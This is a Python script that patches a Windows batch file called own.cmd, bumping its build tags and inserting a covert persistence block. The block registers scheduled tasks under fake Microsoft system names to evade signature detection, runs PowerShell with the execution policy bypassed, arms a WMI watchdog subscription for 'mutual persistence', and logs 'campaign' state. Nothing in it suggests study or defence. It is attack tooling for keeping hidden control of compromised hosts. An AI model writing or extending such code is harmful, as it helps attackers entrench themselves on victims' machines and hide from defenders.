from pathlib import Path

p = Path(r"C:\Users\nobuddy\Desktop\Project\own.cmd")
t = p.read_text(encoding="utf-8")
for a, b in [
    ("O31", "O32"),
    ("20260802O31", "20260802O32"),
    ("20260802M21", "20260802M22"),
    ("20260802L10", "20260802L11"),
    ("20260802T11", "20260802T12"),
]:
    t = t.replace(a, b)

start = t.index("REM anti-signature identity: per-host task names + jittered schedule")
end = t.index("REM campaign state baseline")
new_block = r'''REM anti-signature identity: per-host task names + jittered schedule
REM O32/L11: IDENTVER=6 unique names; tasks-ensure verifies Task To Run owns mon
REM (existence-only Query previously false-OKed Windows Diagnosis\Scheduled).
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\EvtCacheSync"
if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\ServerHealth"
if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHostProxy"
if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpConflictResolver"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "%TASK_A%" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_B%" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_C%" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_D%" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "%TASK_A%" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

'''
t = t[:start] + new_block + t[end:]
t = t.replace(
    "REM OWN BUILD 20260802O32 - unharden-before-write (self-lock fix) + embed + identity + watchdog + pkg.msi fallback",
    "REM OWN BUILD 20260802O32 - task TR ownership IDENTVER=6 + RMM Datto keep + embed",
)
p.write_text(t, encoding="utf-8", newline="\n")
print("own.cmd O32 OK")
